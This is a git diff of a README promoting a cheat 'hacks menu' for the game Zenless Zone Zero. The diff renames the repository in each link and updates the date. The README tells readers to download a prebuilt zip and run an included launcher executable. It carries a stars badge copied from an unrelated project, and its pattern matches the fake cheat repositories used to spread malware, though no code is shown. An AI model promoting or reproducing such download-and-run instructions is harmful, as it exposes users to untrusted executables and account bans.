@@ -1,16 +1,16 @@
-# Zenless Zone Zero Hacks Menu (UPD: 23-Sep-2026)
+# Zenless Zone Zero Hacks Menu (UPD: 26-Sep-2026)
 
-[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/blizzardprincesense/Zenless-Cheat-ZZZ/releases/download/v1.4/ZZZ.hack-1.4.zip)
-[![GitHub release](https://img.shields.io/badge/Release-v1.4-blue?style=for-the-badge)](https://github.com/blizzardprincesense/Zenless-Cheat-ZZZ/releases/download/v1.4/ZZZ.hack-1.4.zip)
+[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/blizzardprincesense/ZZZ-Zenless-Cheat/releases/download/v1.4/ZZZ.hack-1.4.zip)
+[![GitHub release](https://img.shields.io/badge/Release-v1.4-blue?style=for-the-badge)](https://github.com/blizzardprincesense/ZZZ-Zenless-Cheat/releases/download/v1.4/ZZZ.hack-1.4.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](https://opensource.org/licenses/MIT)
-[![Stars](https://img.shields.io/github/stars/sglkc/endfield-auto-daily?style=for-the-badge&logo=github)](https://github.com/blizzardprincesense/Zenless-Cheat-ZZZ/stargazers)
+[![Stars](https://img.shields.io/github/stars/sglkc/endfield-auto-daily?style=for-the-badge&logo=github)](https://github.com/blizzardprincesense/ZZZ-Zenless-Cheat/stargazers)
 
 
 _A powerful hacks tool for Zenless Zone Zero with clean in-game overlay_
 
 
 
-![ZZZ Cheat Preview Hack](https://github.com/blizzardprincesense/Zenless-Cheat-ZZZ/blob/main/assets/image.jpg)
+![ZZZ Cheat Preview Hack](https://github.com/blizzardprincesense/ZZZ-Zenless-Cheat/blob/main/assets/image.jpg)
 
 ## Features
 
@@ -25,7 +25,7 @@ _A powerful hacks tool for Zenless Zone Zero with clean in-game overlay_
 ---
 
 ## How to use
-1. Download the [latest release build](https://github.com/blizzardprincesense/Zenless-Cheat-ZZZ/releases/download/v1.4/ZZZ.hack-1.4.zip) from repo's Releases page.
+1. Download the [latest release build](https://github.com/blizzardprincesense/ZZZ-Zenless-Cheat/releases/download/v1.4/ZZZ.hack-1.4.zip) from repo's Releases page.
 2. Extract the contents to any folder (e.g., `C:\zzz-hacks` or Desktop).
 3. Launch game.
 4. Run `ZZZ-Launcher_github-1.4.exe`.
@@ -63,4 +63,4 @@ Simply delete the extracted folder. There are no registry changes or leftover fi
 ---
 
 
-[![Made with C++](https://img.shields.io/badge/Made%20with-C++-f34b7d?style=for-the-badge&logo=c%2B%2B)](https://github.com/blizzardprincesense/Zenless-Cheat-ZZZ)
+[![Made with C++](https://img.shields.io/badge/Made%20with-C++-f34b7d?style=for-the-badge&logo=c%2B%2B)](https://github.com/blizzardprincesense/ZZZ-Zenless-Cheat)
